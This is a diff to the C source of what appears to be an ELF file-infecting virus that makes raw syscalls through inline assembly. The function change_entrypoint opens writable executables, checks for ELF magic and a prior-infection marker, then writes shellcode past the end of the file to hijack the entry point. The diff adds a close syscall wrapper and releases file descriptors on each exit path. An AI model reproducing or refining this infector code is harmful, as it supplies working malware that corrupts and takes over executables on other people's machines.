@@ -25,6 +25,7 @@ struct linux_dirent {
 };
 static inline int my_access(const char *fpath, int flag);
 static inline int my_open(const char *fpath, int flag);
+static inline int my_close(int fd);
 static inline int my_read(unsigned int fd, char *buf, int count);
 static inline int my_write(unsigned int fd, char *buf, int count);
 static inline int my_lseek(int fd, int offset, int origin);
@@ -115,7 +116,14 @@ static inline int my_write(unsigned int fd, char *buf, int count){
     asm("mov %%rax, %0":"=r"(ret)::);
     return ret;
 }
-
+static inline int my_close(int fd){
+       long long ret;
+       asm("mov %0, %%rdi"::"r"((long long)fd));
+       asm("mov $3, %rax");
+       asm("syscall");
+       asm("mov %%rax, %0":"=r"(ret));
+       return ret;
+}
 static inline int my_lseek(int fd, int offset, int origin){
    long long ret;
    asm("mov %0, %%rdi"::"r"((long long)fd));
@@ -239,8 +247,14 @@ void change_entrypoint(const char* fpath,long long int startrip){
 	if(my_access(fpath,7)!=0) return 0; // R_OK|W_OK|X_OK = 7
 	fd = my_open(fpath, 2); // O_RDWR = 2
 	if (fd < 0) return 0;
-	if (my_read(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) return 0;
-	if(!(ehdr.e_ident[1]=='E' && ehdr.e_ident[2]=='L' && ehdr.e_ident[3]=='F'))return 0;
+	if (my_read(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) {
+		my_close(fd);
+		return 0;
+	}
+	if(!(ehdr.e_ident[1]=='E' && ehdr.e_ident[2]=='L' && ehdr.e_ident[3]=='F')){
+		my_close(fd);
+		return 0;
+	}
 	
 	my_lseek(fd, ehdr.e_phoff, SEEK_SET); 
 	// Read phdr(page header)
@@ -259,7 +273,10 @@ void change_entrypoint(const char* fpath,long long int startrip){
 			}
 		}
 	}
-	if(is_infected_already) return 0;
+	if(is_infected_already) {
+		my_close(fd);
+		return 0;
+	}
 	
 
 	
@@ -458,6 +475,8 @@ void change_entrypoint(const char* fpath,long long int startrip){
 	*/
 	my_lseek(fd, filesize + 10 + 153, SEEK_SET); // 10(main 전 컨텍스트 저장 루틴의 길이) + 153(Patch site) 
 	my_write(fd, shellcode, 24);
+	
+	my_close(fd);
 }
 static inline long long int hereis(){ 
 	 /*
